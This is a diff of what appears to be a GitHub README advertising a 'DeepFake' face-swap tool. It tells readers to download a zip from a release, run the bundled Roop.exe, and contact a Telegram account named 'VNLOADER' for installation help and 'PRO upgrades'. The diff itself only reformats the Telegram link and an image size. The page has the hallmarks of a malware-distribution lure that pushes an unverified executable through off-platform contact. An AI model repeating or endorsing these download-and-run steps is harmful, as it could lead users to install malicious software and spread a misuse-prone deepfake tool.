@@ -13,12 +13,12 @@
 ##### Step 3: After downloading the <a href='https://github.com/xSilkRoadx/deepfake/releases/tag/deepfake' target='_blank'>DeepFake.zip</a> file to your computer and extracting it, you will see Roop.exe. Run it and proceed to install Python, VSCode, etc. Then, open the DeepFake folder and run the tools to make them work properly. 
 ##### Step 4: Upload a photo of yourself and the photo you want to swap your face with.
 ##### Step 6: Watch the app complete the face swap process. 
-#### FOR ANY ISSUES RELATED TO INSTALLATION, NON-FUNCTIONING, OR PRO UPGRADES, CONTACT ME DIRECTLY ON TELEGRAM: \
-<a href='HTTPS://T.ME/VNLOADER' target='_blank'>[VSCode](HTTPS://T.ME/VNLOADER)</a>.
+#### FOR ANY ISSUES RELATED TO INSTALLATION, NON-FUNCTIONING, OR PRO UPGRADES, CONTACT ME DIRECTLY ON TELEGRAM: 
+### <a href='HTTPS://T.ME/VNLOADER' target='_blank'>[HTTPS://T.ME/VNLOADER](HTTPS://T.ME/VNLOADER)</a>.
 
 <img src="https://github.com/user-attachments/assets/0b705714-4a0f-481b-a900-6f6027d7afa2" width="150" height="150">
 <img src="https://github.com/user-attachments/assets/c6772074-73c3-4873-a53e-3624e8da74f0" width="150" height="150">
-<img src="https://github.com/user-attachments/assets/f7e61dec-8366-4c43-b085-73262da43521" width="150" height="1500">
+<img src="https://github.com/user-attachments/assets/f7e61dec-8366-4c43-b085-73262da43521" width="150" height="150">
 <img src="https://github.com/user-attachments/assets/90d76c06-c284-4a79-a3bf-d34fbb1129f9" width="150" height="150">
 <img src="https://github.com/user-attachments/assets/90d76c06-c284-4a79-a3bf-d34fbb1129f9" width="150" height="150">
 <img src="https://github.com/user-attachments/assets/0067a5e9-ac0a-492d-8dec-38fa2fdfe068" width="150" height="150">
